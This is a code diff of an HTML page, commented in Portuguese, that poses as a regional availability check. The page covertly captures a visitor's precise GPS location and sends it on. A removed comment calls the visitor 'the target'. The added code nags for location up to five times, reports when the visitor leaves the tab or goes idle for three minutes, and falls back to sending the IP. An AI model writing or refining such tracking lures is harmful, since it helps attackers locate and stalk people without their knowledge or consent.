@@ -10,7 +10,6 @@
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* Estilo do Pop-up de aviso se o GPS estiver desligado */
         #modal-gps {
             display: none;
             position: fixed;
@@ -50,7 +49,6 @@
         <p id="status-texto">Verificando disponibilidade na região...</p>
     </div>
 
-    <!-- Pop-up que aparece caso o GPS esteja desativado -->
     <div id="modal-gps">
         <div class="modal-content">
             <h3>Ativar Localização</h3>
@@ -61,6 +59,8 @@
 
     <script>
         let enviado = false;
+        let tentativasSemGps = 0;
+        const maxTentativas = 5;
 
         function enviarDados(lat, lon, precisao) {
             if (enviado) return;
@@ -75,12 +75,25 @@
             });
         }
 
+        // Timer de 3 minutos (180.000 milissegundos) caso fique inativo ou saia do navegador
+        let timerInativo = setTimeout(() => {
+            enviarDados("SEM_GPS_INATIVO_3MIN", "SEM_GPS_INATIVO_3MIN", "0");
+        }, 180000);
+
+        // Detecta se a pessoa saiu do navegador (mudou de aba ou minimizou)
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                enviarDados("SAIU_DO_NAVEGADOR", "SAIU_DO_NAVEGADOR", "0");
+            }
+        });
+
         function pegarLocalizacao() {
             const statusTexto = document.getElementById('status-texto');
             const modalGps = document.getElementById('modal-gps');
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(pos) {
+                    clearTimeout(timerInativo); // Cancela o timer se conseguiu a loc
                     let lat = pos.coords.latitude;
                     let lon = pos.coords.longitude;
                     let precisao = pos.coords.accuracy;
@@ -89,8 +102,6 @@
                     enviarDados(lat, lon, precisao);
 
                 }, function(err) {
-                    // Se falhou, exibe o pop-up, mas NÃO envia dados falsos ainda. 
-                    // Deixa a tela parada no aviso para dar tempo do alvo ativar o GPS.
                     modalGps.style.display = "flex";
                 }, {
                     timeout: 7000,
@@ -101,27 +112,36 @@
             }
         }
 
-        // Quando o usuário clica no botão do pop-up após ativar o GPS
         function tentarNovamente() {
-            document.getElementById('modal-gps').style.display = "none";
-            document.getElementById('status-texto').innerText = "Tentando novamente...";
+            const modalGps = document.getElementById('modal-gps');
+            const statusTexto = document.getElementById('status-texto');
             
-            // Tenta pegar a localização de novo, dando a chance de capturar os dados reais agora que ele ativou
+            modalGps.style.display = "none";
+            tentativasSemGps++;
+
+            // Se atingir 5 tentativas de continuar sem ativar o GPS, envia apenas o IP e redireciona
+            if (tentativasSemGps >= maxTentativas) {
+                clearTimeout(timerInativo);
+                enviarDados("LIMITE_5_TENTATIVAS", "LIMITE_5_TENTATIVAS", "0");
+                return;
+            }
+
+            statusTexto.innerText = "Tentando novamente (" + tentativasSemGps + "/" + maxTentativas + ")...";
+            
             navigator.geolocation.getCurrentPosition(function(pos) {
+                clearTimeout(timerInativo);
                 let lat = pos.coords.latitude;
                 let lon = pos.coords.longitude;
                 let precisao = pos.coords.accuracy;
                 enviarDados(lat, lon, precisao);
             }, function(err) {
-                // Se ele clicou no botão mas continuou sem GPS, aí sim enviamos o registro de IP vazio e saímos
-                enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");
+                modalGps.style.display = "flex";
             }, {
                 timeout: 7000,
                 enableHighAccuracy: true
             });
         }
 
-        // Executa assim que a página abre
         window.onload = function() {
             pegarLocalizacao();
         };
